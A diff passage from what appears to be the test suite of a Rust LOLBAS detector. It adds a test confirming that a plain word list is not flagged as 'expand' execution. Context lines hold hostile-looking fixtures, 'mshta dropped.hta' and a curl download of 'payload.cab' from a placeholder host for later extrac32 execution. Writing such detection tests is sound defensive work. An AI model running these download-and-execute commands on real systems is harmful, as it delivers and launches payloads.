@@ -62285,6 +62285,20 @@ mshta dropped.hta"#,
     }
 
     #[test]
+    fn expand_word_list_does_not_emit_lolbas_trait() {
+        let report = crate::analyze(b"expand tasteful saw live", &Config::default());
+
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Lolbas { name, .. } if name == "expand")),
+            "word list must not be treated as expand execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn extrac32_slash_equivalent_source_preserves_download_source_for_later_execution() {
         let report = crate::analyze(
             br#"curl -o C:\Temp\payload.cab https://extrac32-slash-source.example/payload.cab
